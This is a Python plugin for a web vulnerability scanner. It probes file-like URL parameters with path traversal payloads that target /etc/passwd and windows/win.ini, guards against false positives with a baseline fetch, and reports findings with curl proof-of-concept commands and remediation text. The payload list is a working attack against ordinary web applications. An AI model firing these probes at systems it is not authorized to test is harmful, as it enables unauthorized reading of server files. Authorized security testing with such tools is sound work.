"""Directory / path traversal detector (active, non-destructive).

Probes file-ish query parameters with traversal payloads and checks for
/etc/passwd leakage (read-only GET, extracts nothing else). Also checks
for Windows-style (..\\..\\windows\\win.ini) markers.

Scheduling: file-ish-param URLs are probed FIRST (the vuln lives in
?file=/path=, not ?id=), each URL gets one baseline fetch (not one per
payload), and URLs probe concurrently under a shared semaphore. This
killed the old failure mode where alphabetical ordering burned the
whole 60s budget on non-fileish URLs before reaching the real target.

GET only. No file writes, no data extraction beyond the passwd marker.
Authorized testing only.
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import List, Set
from urllib.parse import parse_qsl, urlparse

from ..classifier import domain_from_target
from ..ratelimit import fetch
from ..net import web_base
from .base import Cost, Ctx, Finding, Plugin, PluginResult, Target
from .injutil import fetch_homepage, param_urls, probe_url, fetch_baseline, \
    over_budget

TRAVERSAL_PAYLOADS = [
    "....//....//....//....//etc/passwd",
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....\\....\\....\\....\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
]

PASSWD_MARKERS = ["root:x:0:0", "root:x:0:0:root"]
WININI_MARKERS = ["[extensions]", "[fonts]", "for 16-bit app support"]

FILEISH_PARAMS = {"file", "path", "page", "include", "template", "name",
                  "f", "doc", "document", "filename", "filepath", "load",
                  "read", "view", "download", "attachment"}

REMEDIATION = ("Canonicalize all file paths server-side and reject any "
               "input containing '..'. Never build filesystem paths from "
               "user input; use an allowlist of file identifiers instead.")


class TraversalPlugin(Plugin):
    id = "traversal"
    aggressive = True  # suppressed on WAF-protected hosts
    label = "Path Traversal Check"
    accepts = ["domain", "url"]
    passive = False
    cost = Cost.FREE
    group = "web"
    # Traversal probing is payload-heavy across many URLs; give it the
    # runner's full per-plugin budget.
    timeout_s = 120
    description = "Probe file params for directory traversal (read-only passwd check)."

    @staticmethod
    def _url_priority(u: str) -> tuple:
        """File-ish params first: the vuln lives in ?file=/path=, not ?id=.
        Alphabetical order previously buried real targets behind a dozen
        non-fileish URLs and the plugin timed out before reaching them."""
        try:
            params = parse_qsl(urlparse(u).query, keep_blank_values=True)
        except Exception:
            params = []
        fileish = sum(1 for n, _ in params if n.lower() in FILEISH_PARAMS)
        return (-fileish, u)

    async def run(self, target: Target, ctx: Ctx) -> PluginResult:
        t0 = time.monotonic()
        domain = domain_from_target(target.type, target.normalized)
        if not domain:
            return self._skipped("no domain for this target type")
        base = (await web_base(ctx, target, domain)).rstrip("/")
        if self.module_mode(ctx) == "passive":
            return self._skipped("active probing only (passive mode)")
        findings: List[Finding] = []

        try:
            html, page_url = await fetch_homepage(ctx, base)
        except Exception as e:
            return self._degraded(f"could not fetch homepage: {str(e)[:120]}")

        urls = param_urls(html, page_url, domain, ctx)
        if not urls:
            # No parameterized URLs found: still probe the base URL's
            # common file params directly (one cheap sweep).
            urls = {base}

        sem = asyncio.Semaphore(6)
        tested = [0]
        confirmed = [False]

        async def probe_one(u: str):
            if confirmed[0]:
                return
            parts = urlparse(u)
            try:
                params = parse_qsl(parts.query, keep_blank_values=True)
            except Exception:
                return
            if not params and u != base:
                return
            if params:
                # Prefer file-ish params; fall back to the first 2 params.
                fileish = [n for n, _ in params if n.lower() in FILEISH_PARAMS]
                names = fileish or [n for n, _ in params[:2]]
                base_params = params
            else:
                names = ["file", "path", "page", "include", "template", "name"]
                base_params = [(n, "1") for n in names]
            # Baseline ONCE per URL (FP guard), not once per payload:
            # markers like "root:x:0:0" or "[extensions]" can exist in
            # the page's normal content (docs, tutorials). Only flag
            # when the marker appears in the probed response but NOT
            # in the baseline.
            base_body, _ = await fetch_baseline(ctx, u, timeout=12)
            base_body = base_body[:50000]
            for name in names[:6]:
                if confirmed[0]:
                    break
                for payload in TRAVERSAL_PAYLOADS[:3]:
                    if confirmed[0] or over_budget(t0, budget_s=100):
                        break
                    purl = probe_url(parts, base_params, name, payload)
                    try:
                        async with sem:
                            r = await fetch(ctx.http, ctx.limiter, "GET", purl,
                                            timeout=12, follow_redirects=True)
                    except Exception:
                        continue
                    tested[0] += 1
                    body = r.text[:50000]
                    if any(m in body for m in PASSWD_MARKERS) and \
                            not any(m in base_body for m in PASSWD_MARKERS):
                        findings.append(self._f(
                            "web", "dir_traversal_confirmed",
                            f"HIGH: Path traversal CONFIRMED - /etc/passwd leaked via "
                            f"?{name}=. Proved with: curl -s '{purl[:100]}' | grep root:x",
                            source="traversal probe", source_url=purl,
                            confidence=95, passive=False,
                            exploitability="public_poc",
                            evidence={
                                "severity": "high",
                                "remediation": REMEDIATION,
                                "poc_command": f"curl -s '{purl}' | grep -c 'root:x:0:0'"}))
                        confirmed[0] = True
                        self._checkpoint(findings)
                        break
                    if any(m in body for m in WININI_MARKERS) and \
                            not any(m in base_body for m in WININI_MARKERS):
                        findings.append(self._f(
                            "web", "dir_traversal_confirmed",
                            f"HIGH: Windows path traversal CONFIRMED - win.ini leaked via "
                            f"?{name}=. Proved with: curl -s '{purl[:100]}'",
                            source="traversal probe", source_url=purl,
                            confidence=92, passive=False,
                            exploitability="public_poc",
                            evidence={
                                "severity": "high",
                                "remediation": REMEDIATION,
                                "poc_command": f"curl -s '{purl}' | head -5"}))
                        confirmed[0] = True
                        self._checkpoint(findings)
                        break

        ordered = sorted(urls, key=self._url_priority)[:12]
        await asyncio.gather(*[probe_one(u) for u in ordered])

        dur = int((time.monotonic() - t0) * 1000)
        note = f"traversal probes sent: {tested[0]}"
        if not findings:
            note += " - no /etc/passwd or win.ini leakage detected"
        res = self._ok(findings, note)
        res.duration_ms = dur
        return res
